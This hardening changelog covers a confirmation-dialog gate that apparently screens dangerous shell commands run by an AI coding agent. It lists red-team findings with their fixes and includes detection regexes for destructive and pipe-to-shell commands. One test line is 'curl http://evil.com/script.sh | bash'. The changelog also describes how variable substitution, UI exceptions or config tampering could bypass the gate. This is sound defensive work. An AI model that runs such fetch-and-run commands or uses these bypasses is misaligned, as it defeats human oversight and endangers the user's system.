# Hardening Changelog — dangergate-popup

**Date**: 2026-05-16
**Based on audit**: `docs/security/redteam-findings-dangergate-popup.md`
**Hardened spec**: `docs/specs/dangergate-popup.md`

## Summary

| Severity | Total Findings | Resolved | Deferred | Acknowledged (no change) |
|----------|---------------|----------|----------|--------------------------|
| CRITICAL | 3 | 3 | 0 | 0 |
| WARNING  | 7 | 5 | 2 | 0 |
| INFO     | 5 | 0 | 0 | 5 |

---

## Changes by Finding

### 🔴 CRITICAL — All Resolved

#### Finding #1: Missing `ctx.hasUI` guard in implementation — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Environment Constraints + Proposed Solution
- **Mitigation applied**: Added mandatory `ctx.hasUI` check before pattern matching. When false: `console.warn()` + allow-through. Updated Architecture Diagram to show non-interactive guard path with UI-throw fallback. Updated User Story 3 acceptance criteria to reference CRITICAL fix.
- **Verification method**: Integration test against `pi -p` (print mode) → no hang, warning logged, command allowed through
- **Diff summary**: Added guard check paragraph to Proposed Solution; added E1/E2 nodes to architecture diagram; strengthened User Story 3 acceptance criteria

#### Finding #2: `ctx.ui.custom()` exception bypasses gate entirely — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Error Scenarios + Proposed Solution Overview
- **Mitigation applied**: Made try/catch around `ctx.ui.custom()` a MANDATORY requirement (moved from "should" in Error Scenarios to explicit requirement in Proposed Solution). Added red team hardening note documenting Pi's fail-safe behavior (`tool_call` errors block the tool) as secondary safety net.
- **Verification method**: Integration test with simulated TUI error → command blocked by fail-safe or allowed with explicit logged warning via try/catch
- **Diff summary**: Strengthened Error Scenarios language from "should catch" to "MUST be wrapped in try/catch"; added hardening note to trade-off analysis

#### Finding #3: Return shape `{ block: true }` may not be recognized by Pi — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Extension API Interface
- **Mitigation applied**: Verified against Pi Extension API documentation (extensions.md §Tool Events, line 688): `{ block: true, reason?: string }` is the documented and correct return shape for `tool_call` events. Session events use `{ cancel: true }`; tool_call uses `{ block: true }`. Both spec table and code confirmed correct.
- **Verification method**: Cross-reference with Pi Extension API docs; existing unit test suite confirms Pi recognizes `{ block: true }` return
- **Diff summary**: Added verification note to Events Consumed table documenting the confirmed API contract

---

### 🟡 WARNING — Resolved / Deferred

#### Finding #4: No timeout on dialog — indefinite hang possible — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Risk Assessment (R1) + Dialog Component Lifecycle
- **Mitigation applied**: Moved from "Future enhancement" to Phase 1 requirement. Default timeout: 60s auto-deny. Configurable via `DangergateConfig.timeoutMs`. Countdown displayed in dialog hint when time < 15s remaining. Added to Implementation Plan Phase 1 milestone.
- **Verification method**: Integration test: wait >60s → auto-deny logged, tool blocked with "timeout" reason
- **Diff summary**: Updated Risk R1 from 🔴 High/deferred to 🟡 Medium/mitigated; added `timeoutMs` to config interface; updated Phase 1 milestone

#### Finding #5: Regex word boundary bug: `shred\b` matches `unshred` — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Pattern Reference P3
- **Mitigation applied**: Changed pattern from `/shred\b/` to `/\bshred\b/`. Added exclusion examples to table: `unshred`, `myshredder`.
- **Verification method**: Unit test: `unshred -r file.enc` → no gate triggered; `shred -u file.dat` → gate triggered
- **Diff summary**: P3 pattern corrected with leading `\b`; Excludes column populated

#### Finding #6: Regex word boundary bug: `/dd\s+if=/` matches `badd if=` — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Pattern Reference P5
- **Mitigation applied**: Changed pattern from `/dd\s+if=/` to `/\bdd\s+if=/`. Added exclusion examples: `badd if=`, `grep -r "dd if=" src/`.
- **Verification method**: Unit test: `grep -r "dd if=" src/` → no gate triggered; `dd if=/dev/sda of=backup.img` → gate triggered
- **Diff summary**: P5 pattern corrected with leading `\b`; Excludes column populated

#### Finding #7: Variable substitution bypass — **DEFERRED**
- **Disposition**: DEFERRED
- **Rationale**: Full shell-command parsing (variable expansion, backtick substitution) is out of scope for Phase 1-3. Regex-based matching on command strings has inherent limitations with obfuscation. Adding heuristics for `$VAR` patterns risks high false-positive rate.
- **Revisit trigger**: If Phase 4 adds shell-parsing capability (e.g., `node-shell-parser` or AST-based analysis), revisit obfuscation detection at that time.
- **Residual impact if exploited**: Sophisticated adversarial prompts can bypass the gate via variable substitution, backtick expansion, or `$()` command substitution. Documented explicitly in Security Considerations with user-facing disclaimer.

#### Finding #8: Piped code execution not gated — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Risk Assessment (R2) + Pattern Reference
- **Mitigation applied**: Added four new patterns to Phase 1: P21 (`\|\s*bash\b`), P22 (`\|\s*sh\b`), P23 (`\beval\b`), P24 (`python\d*\s+-c\b`). Updated Risk R2 from 🔴 High to 🟡 Medium with explicit mitigation documentation.
- **Verification method**: Unit test: `curl http://evil.com/script.sh | bash` → gate triggered; `echo hello | sort` → no gate triggered; `python3 script.py` → no gate; `python3 -c "import os"` → gate triggered
- **Diff summary**: Added P21-P24 to Pattern Reference table; updated Risk R2 severity and mitigation text

#### Finding #9: Config file tampering (Phase 2) disables gates without audit trail — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Configuration Interface (Phase 2)
- **Mitigation applied**: Added config validation rules table to Configuration Interface section: (1) additionalPatterns capped at 50, (2) each pattern validated as compilable RegExp on load, (3) excludedPatternIndices limited to <50% of total with warning, (4) minimum 3 default patterns always active (hard floor), (5) load logged with pattern count breakdown. Invalid config → graceful fall back to defaults with `console.warn`.
- **Verification method**: Unit test: config with all-excluded patterns → rejected/warned, defaults used; invalid regex string → error on load with specific message
- **Diff summary**: Added validation rules table and enforcement rationale to Configuration Interface section

#### Finding #10: Long single-line commands cause unbounded memory allocation during render — **RESOLVED**
- **Disposition**: RESOLVED
- **Original spec section**: Dialog Dimensions + Error Scenarios
- **Mitigation applied**: Two changes: (a) Hard cap on total preview characters: 4096 (4KB) with `[... command truncated]` indicator added to Dialog Dimensions. (b) Rendering rule: truncate input BEFORE `padEnd()` (`line.slice(0, width - indent.length - 2).padEnd(...)`) instead of pad-then-slice, eliminating intermediate allocation spike. Added to Error Scenarios documentation.
- **Verification method**: Unit test: render command of 1MB single line → no OOM, output capped at 4KB with truncation indicator
- **Diff summary**: Added MAX_PREVIEW_CHARS and Line truncation order rows to Dialog Dimensions table; strengthened Error Scenarios text

#### Finding #11: Heredoc commands trigger false positives — **DEFERRED**
- **Disposition**: DEFERRED
- **Original spec section**: Error Scenarios + Pattern Reference
- **Rationale**: Heredoc-aware parsing requires understanding shell quoting context (single-quote vs double-quote heredocs, variable expansion inside), which is complex and error-prone with regex alone. Out of scope for Phase 1-3.
- **Revisit trigger**: If user feedback indicates high false-positive rate from heredocs in Phase 1-2 testing, consider Phase 3 enhancement or later.
- **Residual impact if exploited**: User fatigue from false positives may lead to blind confirmation habit. Partially mitigated by showing matched pattern category in dialog (Phase 3 plan).

---

### ℹ️ INFO — Acknowledged Only

#### Finding #12: First-match-only pattern selection hides which pattern triggered the gate — **ACKNOWLEDGED**
- **Disposition**: ACKNOWLEDGED — no spec change required
- **Note**: Already planned for Phase 3 (matched-pattern display in dialog). No CRITICAL/WARNING risk; purely UX improvement.

#### Finding #13: Unicode/emoji in command paths may corrupt dialog rendering — **ACKNOWLEDGED**
- **Disposition**: ACKNOWLEDGED — no spec change required
- **Note**: Low-priority rendering edge case. Current `slice()` truncation works for ASCII. If international support needed, consider `string-width` library in future iteration.

#### Finding #14: No pattern count limit in Phase 2 config — potential DoS via regex complexity — **ACKNOWLEDGED**
- **Disposition**: ACKNOWLEDGED — covered by Finding #9 mitigation (capped at 50 patterns with validation)

#### Finding #15: Dialog scroll position resets on each render — no state persistence across re-renders — **ACKNOWLEDGED**
- **Disposition**: ACKNOWLEDGED — no spec change required
- **Note**: `scrollOffset` is instance state and persists across renders of same dialog. Terminal resize edge case noted; low-priority UX refinement for future iteration.

#### Finding #16: P12 (`:wq!$/m`) gates non-destructive operation with no clear risk — **ACKNOWLEDGED**
- **Disposition**: ACKNOWLEDGED — RESOLVED inline (P12 removed from pattern registry, marked ~~REMOVED~~)
- **Note**: Non-destructive vim command in bash context adds noise without safety value. Removed during hardening pass.

---

## Cross-Reference Table

| # | Severity | Title | Disposition | Spec Section |
|---|----------|-------|-------------|--------------|
| 1 | CRITICAL | Missing `ctx.hasUI` guard | **RESOLVED** | Proposed Solution; Architecture Diagram; User Stories #3 |
| 2 | CRITICAL | `ctx.ui.custom()` exception bypasses gate | **RESOLVED** | Proposed Solution; Error Scenarios; Trade-off Analysis |
| 3 | CRITICAL | Return shape `{ block: true }` mismatch risk | **RESOLVED** | Extension API Interface (Events Consumed) |
| 4 | WARNING | No timeout on dialog — indefinite hang | **RESOLVED** | Risk Assessment R1; Configuration Interface; Implementation Plan |
| 5 | WARNING | Regex word boundary: `shred\b` → false positives | **RESOLVED** | Pattern Reference P3 |
| 6 | WARNING | Regex word boundary: `dd\s+if=` → false positives | **RESOLVED** | Pattern Reference P5 |
| 7 | WARNING | Variable substitution bypass | **DEFERRED** | Security Considerations §Variable substitution bypass |
| 8 | WARNING | Piped code execution not gated | **RESOLVED** | Pattern Reference P21-P24; Risk Assessment R2 |
| 9 | WARNING | Config file tampering without audit trail | **RESOLVED** | Configuration Interface (Phase 2) — validation rules table |
| 10 | WARNING | Long command unbounded memory allocation | **RESOLVED** | Dialog Dimensions; Error Scenarios |
| 11 | WARNING | Heredoc false positives | **DEFERRED** | Security Considerations §Heredoc false positives |
| 12 | INFO | First-match-only hides pattern category | **ACKNOWLEDGED** | — (Phase 3 plan covers this) |
| 13 | INFO | Unicode/emoji rendering corruption | **ACKNOWLEDGED** | — (low-priority future consideration) |
| 14 | INFO | No pattern count limit in config | **ACKNOWLEDGED** | — (covered by #9 mitigation) |
| 15 | INFO | Scroll position resets on resize | **ACKNOWLEDGED** | — (low-priority UX refinement) |
| 16 | INFO | P12 gates non-destructive operation | **ACKNOWLEDGED** | Pattern Reference P12 ~~REMOVED~~ |

> Every finding from the audit has a disposition. No gaps.

---

## Residual Risks

| Risk | Monitoring Strategy | Acceptance |
|------|---------------------|------------|
| Variable substitution bypass (Finding #7) | Documented in Security Considerations with explicit user disclaimer that gate is NOT comprehensive protection. Phase 4 revisit trigger defined. | Accepted — regex-based matching inherently cannot catch all obfuscation patterns without full shell parsing |
| Heredoc false positives (Finding #11) | User feedback during Phase 1-2 testing will indicate false-positive rate. If high, escalate to Phase 3 enhancement. | Accepted — edge case with low exploitability; false positives are safer than false negatives for a safety gate |

---

## Spec Changes Summary

| Area | Change Type | Details |
|------|-------------|---------|
| YAML front matter | Updated | `status: hardened`, `version: 1.1.0`, added `hardened_date` and `hardened_findings_addressed` |
| Status header | Updated | 🟡 DRAFT → 🟢 HARDENED, version 1.0.0 → 1.1.0 |
| Proposed Solution | Strengthened | Added mandatory non-interactive guard paragraph; added try/catch requirement; added red team hardening note re: Pi fail-safe behavior |
| Architecture Diagram | Updated | Added E1 (ctx.hasUI check) and E2 (console.warn + pass-through) nodes; G node annotated with "(wrapped in try/catch)" |
| User Stories | Updated | Story #3 acceptance criteria strengthened to reference CRITICAL fix |
| Pattern Reference | Expanded + Fixed | P3/P5 word boundary fixes; P12 removed; P21-P24 added (pipe/eval/python) |
| Dialog Dimensions | Strengthened | Added MAX_PREVIEW_CHARS (4KB cap); added Line truncation order rule |
| Configuration Interface | Strengthened | Added validation rules table; added `timeoutMs` field |
| Implementation Plan | Updated | Phase 1 scope expanded to include timeout + new patterns + guards; Phase 2 includes config validation |
| Risk Assessment | Updated | R1/R2 severity downgraded from 🔴 High to 🟡 Medium with explicit mitigations |
| Error Scenarios | Strengthened | Made try/catch MANDATORY requirement; added truncation-before-padEnd rule |
| Security Considerations | **NEW SECTION** | Added comprehensive section documenting all 16 findings with dispositions (RESOLVED/DEFERRED/ACKNOWLEDGED) |
| Open Questions | Updated | Crossed out resolved items (timeout behavior, pattern display) |

---

## Sign-off

- [x] All `[CRITICAL]` findings have documented mitigations
- [x] All `[WARNING]` findings are resolved or deferred with justification
- [x] "Security Considerations" section present in spec
- [x] Spec YAML front matter updated to `hardened` status
- [x] Changelog cross-reference table complete (no finding skipped without explanation)

---

*Harden changelog generated 2026-05-16 · Based on red team audit of dangergate-popup spec v1.0.0*
